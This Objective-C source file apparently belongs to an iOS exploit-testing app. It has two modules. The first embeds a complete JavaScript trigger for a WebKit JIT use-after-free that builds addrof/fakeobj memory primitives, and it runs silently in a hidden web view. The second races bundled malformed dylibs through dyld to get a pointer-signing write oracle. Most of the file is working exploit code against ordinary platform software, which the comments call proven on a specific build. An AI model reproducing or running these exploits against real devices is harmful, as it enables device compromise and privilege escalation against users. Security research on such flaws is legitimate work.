#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ---------------------------------------------------------------------------
// WebKit DFG store-barrier UAF (CVE-2025-43529) — proven on 23C5027f at round 112.
// Runs inside a private WKWebView owned by the app: no Safari, no user taps.
// The page is the exact trigger that produced addrof + fakeobj on this device.
// ---------------------------------------------------------------------------
static const char *kUAFPage =
"<html><body><script>"
"arr = new Array(0x400000).fill(1.1);"
"let arr_index = arr.length - 1;"
"function foo(flag, k, allocCount) {"
"  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };"
"  arr[arr_index] = A;"
"  let forGC = [];"
"  let a = new Date(1111); a[0] = 1.1;"
"  for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));"
"  A.p2 = forGC;"
"  let b = { p0: 0x42424242, p1: 1.1 };"
"  let f; f = b; if (flag) { f = 1.1; }"
"  A.p1 = f;"
"  let v = 1.1;"
"  for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }"
"  b.p0 = v; b.p1 = a;"
"}"
"function rec(n){ if(n===0) return; n=n|0; rec(n-1); }"
"function main(){"
"  foo(true,1,1); foo(false,1,1);"
"  for(let i=0;i<1000;++i) foo(false,0,0);"
"  for(let i=0;i<10000;i++) rec(i);"
"  for (let k = 0; k < 10000; ++k) {"
"    foo(false, 10, k % 5 + 1); rec(10000);"
"    for (let i=0;i<3;++i) new ArrayBuffer(0x4000);"
"    let freed = arr[arr_index].p1.p1;"
"    let noCow = 13.37, win = false, base = null;"
"    for (let i=0;i<16;++i) { let c=[13.37,2.2,3.3,4.4,noCow]; if (freed[0]===13.37){win=true;base=c;break;} }"
"    if (!win) continue;"
"    let boxed = base, unboxed = freed;"
"    let ab=new ArrayBuffer(8), u=new BigUint64Array(ab), d=new Float64Array(ab);"
"    const itof=v=>(u[0]=v,d[0]), ftoi=f=>(d[0]=f,u[0]);"
"    const addrof=o=>(boxed[0]=o, ftoi(unboxed[0]));"
"    const fakeobj=a=>(unboxed[0]=itof(a), boxed[0]);"
"    let a1 = addrof({p0:1.1});"
"    let fk = fakeobj(a1);"
"    return 'UAF round=' + k + ' addrof=0x' + a1.toString(16) + ' fakeobj=' + (typeof fk);"
"  }"
"  return 'no-uaf';"
"}"
"'RESULT ' + main();"
"</script></body></html>";

NSString *ModWebKitUAF(void) {
    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
    [wv loadHTMLString:[NSString stringWithUTF8String:kUAFPage] baseURL:nil];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSString *res = @"(no answer)";
    NSString *js = [NSString stringWithUTF8String:kUAFPage];
    [wv evaluateJavaScript:@"document.body.innerText" completionHandler:^(id v, NSError *e) {
        if (e) res = e.localizedDescription ?: @"error";
        else if ([v isKindOfClass:[NSString class]]) res = v;
        else res = [v description];
        dispatch_semaphore_signal(s);
    }];
    // the heavy GC loop can take a while; give it room but not forever
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 180 * NSEC_PER_SEC));
    [wv stopLoading]; wv = nil;
    AveLog([NSString stringWithFormat:@"    UAF: %@", res]);
    return res;
}

// ---------------------------------------------------------------------------
// dyld PAC signing oracle (CVE-2026-20700-class, unpatched until 26.3).
// Bundled hand-crafted dylibs (libexports/libclient/libmalformed) are dlopen'ed
// from the app bundle; the chain makes dyld resolve _write_target_value into our
// __DATA+0x10 slot.  The pointer is only READ, never called: a cross-image call
// faults on PAC (measured on this build), and the app must stay alive.
// ---------------------------------------------------------------------------
extern void attacker_hook(void);

static void *find_data_of(const char *base) {
    uint32_t n = _dyld_image_count();
    for (uint32_t i = 0; i < n; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name) continue;
        const char *b = strrchr(name, '/');
        b = b ? b + 1 : name;
        if (!strstr(b, base)) continue;
        const struct mach_header *mh = _dyld_get_image_header(i);
        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
        const uint8_t *lc = (const uint8_t *)((const struct mach_header_64 *)mh + 1);
        for (uint32_t j = 0; j < ((const struct mach_header_64 *)mh)->ncmds; j++) {
            const struct load_command *cmd = (const struct load_command *)lc;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
                if (!strncmp(seg->segname, "__DATA", 6)) return (void *)(seg->vmaddr + slide);
            }
            lc += cmd->cmdsize;
        }
    }
    return NULL;
}

NSString *ModDyldOracle(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *ex = [bundle stringByAppendingPathComponent:@"libexports.dylib"];
    NSString *cl = [bundle stringByAppendingPathComponent:@"libclient.dylib"];
    NSString *mal = [bundle stringByAppendingPathComponent:@"Frameworks/libmalformed.dylib"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:mal])
        return @"bundled dylibs not found";

    void *h_ex = dlopen(ex.UTF8String, RTLD_NOW | RTLD_GLOBAL);
    if (!h_ex) { AveLog(S(@"    dlopen libexports: %s", dlerror())); return @"libexports did not load"; }
    AveLog(@"    libexports loaded");

    // Thread B: the 99k-symbol client is what opens the page-in-linking gate
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        void *h_cl = dlopen(cl.UTF8String, RTLD_NOW);
        AveLog(h_cl ? @"    libclient loaded (gate open)" : @"    libclient did not load");
    });

    AveSleep(600);                      // let Thread B start loading first

    void *h_mal = dlopen(mal.UTF8String, RTLD_NOW);
    if (!h_mal) {
        AveLog(S(@"    dlopen libmalformed: %s", dlerror()));
        return @"libmalformed REJECTED by dyld";
    }
    AveLog(@"    libmalformed accepted by dyld");

    void *data = find_data_of("libmalformed.dylib");
    if (!data) return @"__DATA of libmalformed not found";
    uint64_t *slots = (uint64_t *)data;
    uint64_t cb = slots[0], wt = slots[2], ca = slots[3], wt2 = slots[4];
    AveLog(S(@"    canary_before=%#llx canary_after=%#llx wt=%#llx wt2=%#llx", cb, ca, wt, wt2));
    BOOL canaries = (cb == 0xAAAAAAAAAAAAAAAAULL) && (ca == 0xBBBBBBBBBBBBBBBBULL);
    BOOL written  = (wt != 0xDEADDEADDEADDEADULL);
    int bit63 = (int)((wt >> 63) & 1);
    AveLog(S(@"    dyld %@ into __DATA+0x10; bit63=%d (%s)",
             written ? @"WROTE" : @"did not write", bit63,
             bit63 ? @"encoded bind" : @"resolved pointer"));
    // measure against the symbol's own address (as the PoC does)
    void *sym = dlsym(RTLD_DEFAULT, "write_target_value");
    if (sym) AveLog(S(@"    dlsym(write_target_value) = %p", sym));

    dlclose(h_mal);
    return S(@"dyld oracle: %@ canaries=%@ wt=%#llx (dlsym=%p)%@",
             written ? @"WRITE CONFIRMED" : @"no write",
             canaries ? @"intact" : @"broken",
             (unsigned long long)wt, sym,
             written && bit63 == 0 ? @"  PAC-  " : @"");
}
